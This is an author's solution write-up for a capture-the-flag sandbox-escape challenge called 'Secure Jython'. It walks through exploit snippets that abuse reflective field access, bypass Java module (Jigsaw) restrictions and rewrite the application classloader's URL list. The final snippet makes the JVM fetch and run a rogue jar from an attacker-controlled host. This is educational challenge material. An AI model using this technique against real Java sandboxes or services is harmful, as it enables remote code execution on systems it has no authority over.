# Secure Jython Solution

Refer to `exp.py` for complete exploit

So this was a refit of a challenge written last year with no solves. This
utilizes a similar technique to the other challenge, but looks entirely
different... at least at first glance.

Here we have a simplified implementation of a python interpreter (with much of
its AST trimmed down), so that the only thing we could do is set/get fields.
There was also a special reference/dereference syntax that I added mainly to be
hacked.

The first weird thing about this jython interpreter is the thin separation
between the jython objects its Java counterpart. In fact, it directly reads the
fields of those Java objects (even private ones!) Furthermore, it calls
`setAccessible` to bypass Java's access validator (so that we can write/read to
private fields, and even final fields!).

## Background
Before I came to create this challenge, I've actually tried placing this
novel technique that I found in multiple iterations of challenges.

### JHeap
The earliest iteration of such technique, I actually thought of it as a
second-stage to the ancient JHeap challenge in a way to get full code execution
(a recap of the challenge: the challenge had a heap overflow vulnerability that
caused you to be able to read/write arbitrary data on the Java heap, and this
was due to a quirk of UTF-8 encoding).

When I was searching for an exploit path to JHeap, I noticed that there weren't
any way to really execute arbitrary methods/constructors/etc... because all
the code and method tables were placed in unaddressable memory (because the Java
heap compresses all pointers to 32-bit). So I came up instead with a way to
chain various arbitrary writes into the Java heap to trick the JVM into loading
a custom class of our choosing. Once we do that, we can do a custom static
initializer to run our devious code.

### JSandbox
Since JHeap was hard to begin with, I broke out the technique used into a
separate challenge called JSandbox. Unfortunately due to the late release, the
challenge was largely overlooked, and there were little discussion made, so as
any "*good*" challenge author, I reused the challenge, and incorporated into
this challenge called *Secure Jython*. This utilized essentially the same
technique of exploitation except using latest and greatest Java version!

## Exploit Path
I will now break down the exploit into several sections.

### FieldRef gadget
This jython version implements an interesting "FieldRef" feature that allows us
to read/write to "field pointers". So we first construct a field reference:
```python
fld = &'pwn'.value
FieldRef = fld.__class__
```

We can then modify `fld.self` and `fld.member` to read/write from _almost_ any
arbitrary fields as if they were ordinary objects, even those that have special
`__getattr__` functions.

### Escaping Jigsaw Prison
Unfortunately, a new functionality implemented in project Jigsaw (to what seems
like decades of eternities before) in java 9 enforced this idea of modularity,
such that you cannot access internals of internal classes no matter what you do
to cajole it to.

In the `jython` shell script, there's this perculiar flag:
`--add-opens=java.base/java.lang=ALL-UNNAMED` which essentially allows anyone to
read/write arbitrary fields to all classes in the `java.lang` package.

We can use this to bypass the entire Jigsaw prison:
```python
Class = java.lang.Class
f_module = Class.module
fld.self = Class
fld.member = f_module
m_java_base = *fld

fld.self = FieldRef
fld.member = f_module
*fld = m_java_base
```

This will then put the FieldRef class as if it were in the `java.base` module,
allowing us access to internal module fields!

### Backdooring our Builtin classloaders
Here we obtain all the class loaders from the ClassLoaders class:
```python
ClassLoaders = jdk.internal.loader.ClassLoaders
BuiltinClassLoader = jdk.internal.loader.BuiltinClassLoader

fld.self = None
fld.member = ClassLoaders.BOOT_LOADER
BOOT = *fld
fld.member = ClassLoaders.PLATFORM_LOADER
PLAT = *fld
fld.member = ClassLoaders.APP_LOADER
APP = *fld
```

Then in order to add another source to load classes, I obtain the ucp object of
the application class loader:
```python
f_ucp = BuiltinClassLoader.ucp
fld.self = APP
fld.member = f_ucp
ucp = *fld
```

And then add an URL that we own to load our rogue Jar file:
```python
fld.self = None
fld.member = javax.crypto.JceSecurity.NULL_URL
url = *fld

# Set unopenedUrls to our url
ucp.unopenedUrls.head = 0
ucp.unopenedUrls.tail = 1
ucp.unopenedUrls.elements[0] = url

# Canabolize the existing url to point to our server
url.host = HOST
url.authority = AUTHORITY
url.port = PORT
url.file = PATH
url.path = PATH
```

Finally, trigger the actual class loading by loading our rogue class
```python
# Fire away!
import exp.shell
```

<a rel="license" href="http://creativecommons.org/licenses/by/4.0/"><img alt="Creative Commons License" style="border-width:0" src="https://i.creativecommons.org/l/by/4.0/88x31.png" /></a><br />This work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by/4.0/">Creative Commons Attribution 4.0 International License</a>.
